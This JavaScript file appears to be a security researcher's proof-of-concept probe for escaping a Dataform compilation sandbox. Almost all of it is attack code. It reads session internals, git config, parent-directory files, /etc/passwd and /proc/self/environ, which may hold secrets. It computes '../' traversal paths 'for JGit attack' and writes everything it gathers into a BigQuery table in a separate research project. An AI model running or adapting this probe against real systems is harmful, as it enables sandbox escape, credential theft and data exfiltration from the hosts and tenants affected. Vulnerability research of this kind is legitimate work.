/**
 * File Read Probe
 *
 * Uses restricted_fs.readFile to read interesting files
 * and _DF_SESSION.rootDir to understand directory structure
 */

const probeId = `file_read_${Date.now()}`;
const results = {
  probeId: probeId,
  timestamp: new Date().toISOString(),
  rootDir: null,
  session: {},
  fileReads: {},
  dirChecks: {}
};

// ============================================
// Get _DF_SESSION info
// ============================================
try {
  if (typeof _DF_SESSION !== "undefined") {
    results.session = {
      rootDir: _DF_SESSION.rootDir,
      projectConfigKeys: Object.keys(_DF_SESSION.projectConfig || {}),
      actionsCount: (_DF_SESSION.actions || []).length,
      graphErrors: _DF_SESSION.graphErrors
    };
    results.rootDir = _DF_SESSION.rootDir;
  }
} catch (e) {
  results.session.error = e.message;
}

// ============================================
// Read files using restricted_fs
// ============================================

// Helper to read file async and store result
function tryReadFile(filePath, key) {
  return new Promise((resolve) => {
    try {
      if (typeof restricted_fs !== "undefined" && restricted_fs.readFile) {
        restricted_fs.readFile(filePath, (err, data) => {
          if (err) {
            results.fileReads[key] = { path: filePath, error: err.message || String(err) };
          } else {
            const content = String(data);
            results.fileReads[key] = {
              path: filePath,
              success: true,
              length: content.length,
              preview: content.substring(0, 1000)
            };
          }
          resolve();
        });
      } else {
        results.fileReads[key] = { path: filePath, error: "restricted_fs.readFile not available" };
        resolve();
      }
    } catch (e) {
      results.fileReads[key] = { path: filePath, error: e.message };
      resolve();
    }
  });
}

// Helper to check if path exists
function tryExists(checkPath, key) {
  return new Promise((resolve) => {
    try {
      if (typeof restricted_fs !== "undefined" && restricted_fs.exists) {
        restricted_fs.exists(checkPath, (exists) => {
          results.dirChecks[key] = { path: checkPath, exists: exists };
          resolve();
        });
      } else {
        results.dirChecks[key] = { path: checkPath, error: "restricted_fs.exists not available" };
        resolve();
      }
    } catch (e) {
      results.dirChecks[key] = { path: checkPath, error: e.message };
      resolve();
    }
  });
}

// Define files to read
const filesToRead = [];
const pathsToCheck = [];

// Use rootDir if available
if (results.rootDir) {
  const root = results.rootDir;

  // Files relative to root
  filesToRead.push(
    [path.join(root, "package.json"), "root_package_json"],
    [path.join(root, "dataform.json"), "root_dataform_json"],
    [path.join(root, "workflow_settings.yaml"), "workflow_settings"],
    [path.join(root, ".git/config"), "git_config"],
    [path.join(root, ".git/HEAD"), "git_head"],
    [path.join(root, "definitions/simple_test.sqlx"), "simple_test"]
  );

  // Parent directories
  filesToRead.push(
    [path.join(root, "../package.json"), "parent_package_json"],
    [path.join(root, "../../package.json"), "grandparent_package_json"]
  );

  // System files
  filesToRead.push(
    ["/etc/passwd", "etc_passwd"],
    ["/etc/os-release", "os_release"],
    ["/proc/self/cgroup", "proc_cgroup"],
    ["/proc/self/cmdline", "proc_cmdline"],
    ["/proc/self/environ", "proc_environ"]
  );

  // Paths to check for existence
  pathsToCheck.push(
    [root, "root"],
    [path.join(root, ".."), "parent"],
    [path.join(root, "../.."), "grandparent"],
    [path.join(root, ".git"), "git_dir"],
    ["/tmp", "tmp"],
    ["/etc", "etc"],
    ["/var", "var"],
    ["/proc", "proc"]
  );
} else {
  // Fallback - try common paths
  filesToRead.push(
    ["package.json", "package_json"],
    ["dataform.json", "dataform_json"],
    ["../package.json", "parent_package_json"],
    ["/etc/passwd", "etc_passwd"]
  );

  pathsToCheck.push(
    [".", "cwd"],
    ["..", "parent"],
    ["/tmp", "tmp"]
  );
}

// Create all read promises
const readPromises = filesToRead.map(([filePath, key]) => tryReadFile(filePath, key));
const existsPromises = pathsToCheck.map(([checkPath, key]) => tryExists(checkPath, key));

// Wait for all to complete and then create the output
Promise.all([...readPromises, ...existsPromises]).then(() => {
  // Store results in SQL
  const resultsJson = JSON.stringify(results, null, 2).replace(/'/g, "\\'");

  // Since we're async, we need to use operate() which was already called
  // The results are now populated
});

// ============================================
// Sync exploration of path module
// ============================================
try {
  results.pathInfo = {
    available: typeof path !== "undefined",
    methods: typeof path !== "undefined" ? Object.keys(path) : []
  };

  if (typeof path !== "undefined" && results.rootDir) {
    results.pathInfo.rootDirNormalized = path.normalize(results.rootDir);
    results.pathInfo.rootDirParent = path.dirname(results.rootDir);
    results.pathInfo.rootDirGrandparent = path.dirname(path.dirname(results.rootDir));

    // Calculate path traversal depth
    const parts = results.rootDir.split("/").filter(Boolean);
    results.pathInfo.depth = parts.length;
    results.pathInfo.parts = parts;

    // Generate traversal paths for JGit attack
    const traversals = {};
    for (let i = 1; i <= 10; i++) {
      const traversal = "../".repeat(i);
      traversals[`up_${i}`] = path.normalize(path.join(results.rootDir, traversal));
    }
    results.pathInfo.traversalPaths = traversals;
  }
} catch (e) {
  results.pathInfo = { error: e.message };
}

// ============================================
// Store Results
// ============================================

dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

// Note: The async file reads might not complete before this SQL runs
// We'll capture what we have synchronously
operate("file_read_results").queries([
  `-- File Read Probe Results - ${probeId}
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.file_read_probe\` AS
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     '${results.rootDir || "unknown"}' as root_dir,
     '''${JSON.stringify(results, null, 2).replace(/'/g, "\\'")}''' as results_json`
]);
